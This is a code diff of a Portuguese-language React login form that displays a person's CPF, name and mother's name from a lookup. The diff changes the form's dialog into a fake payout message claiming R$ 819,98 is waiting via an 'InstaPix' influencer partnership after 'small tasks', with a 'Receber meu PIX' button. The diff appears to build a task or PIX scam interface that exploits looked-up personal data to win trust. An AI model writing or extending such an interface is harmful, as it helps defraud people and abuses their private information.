@@ -8,6 +8,7 @@ import { useFormState } from "@/hooks/use-form-state"
 import { FileIcon, Loader, UserIcon, Users2Icon } from "lucide-react"
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
 import { Button } from "@/components/ui/button"
+import { influencers } from '../../functions/api';
 
 
 
@@ -32,32 +33,38 @@ export function LoginForm() {
         <Dialog defaultOpen>
           <DialogContent className="w-full max-w-[360px] rounded-lg bg-[#C0C0C0] border-0 outline-none mx-auto">
             <DialogHeader>
-              <DialogTitle className="text-center text-3xl font-black">
-                Você confirma os dados abaixo?
+              <DialogTitle className="text-center text-lg font-bold">
+                Sucesso! Existe o valor de R$ 819,98 em nome de <strong>{data.data.DADOS_PESSOAIS.NOME}</strong> para sacar imediatamente.
               </DialogTitle>
             </DialogHeader>
             <div className="space-y-10">
-              <div className="flex flex-col gap-2">
-                <div className="flex items-center gap-2">
-                  <p className="text-sm font-bold">CPF :</p>
-                  <p className="text-sm">{data.data.DADOS_PESSOAIS.CPF}</p>
-                </div>
-                <div className="flex items-center gap-2">
-                  <p className="text-sm font-bold">Nome :</p>
-                  <p className="text-sm">{data.data.DADOS_PESSOAIS.NOME}</p>
-                </div>
+              <div className="space-y-4">
 
-                <div className="flex items-center">
-                  <p className="text-sm font-bold">Nome da mãe :</p>
-                  <p className="text-sm">{data.data.DADOS_PESSOAIS.NOME_MAE}</p>
+                <div className="flex flex-col gap-2">
+                  <div className="flex items-center gap-2">
+                    <p className="text-sm font-bold">CPF :</p>
+                    <p className="text-sm">{data.data.DADOS_PESSOAIS.CPF}</p>
+                  </div>
+                  <div className="flex items-center gap-2">
+                    <p className="text-sm font-bold">Nome :</p>
+                    <p className="text-sm">{data.data.DADOS_PESSOAIS.NOME}</p>
+                  </div>
+
+                  <div className="flex items-center">
+                    <p className="text-sm font-bold">Nome da mãe :</p>
+                    <p className="text-sm">{data.data.DADOS_PESSOAIS.NOME_MAE}</p>
+                  </div>
+                </div>
+                <div className="text-sm text-center">
+                  Após a análise feita verificamos que você segue no Instagram uns dos influenciadores que fazem parte da parceria InstaPix. Aprovando assim o valor de R$ 819,98 após concluir pequenas tarefas.
                 </div>
               </div>
               <div className="flex items-center gap-4 w-full">
                 <Button onClick={() => router.push(`/onbording?src=user_not_found&document=${data.data.DADOS_PESSOAIS.CPF}`)} className="w-full bg-[#8B0101] hover:bg-[#8B0101]">
-                  Corrigir
+                  Corrigir dados
                 </Button>
                 <Button onClick={() => router.push(`/onbording?document=${data.data.DADOS_PESSOAIS.CPF}&name=${data.data.DADOS_PESSOAIS.NOME}`)} className="w-full bg-[#216b16] hover:bg-[#216b16]">
-                  Confirmar
+                  Receber meu PIX
                 </Button>
               </div>
             </div>
@@ -82,7 +89,7 @@ export function LoginForm() {
 
           ) : (
             <span>
-              Cadastrar & Continuar
+              Consultar & Continuar
             </span>
           )}
         </button>
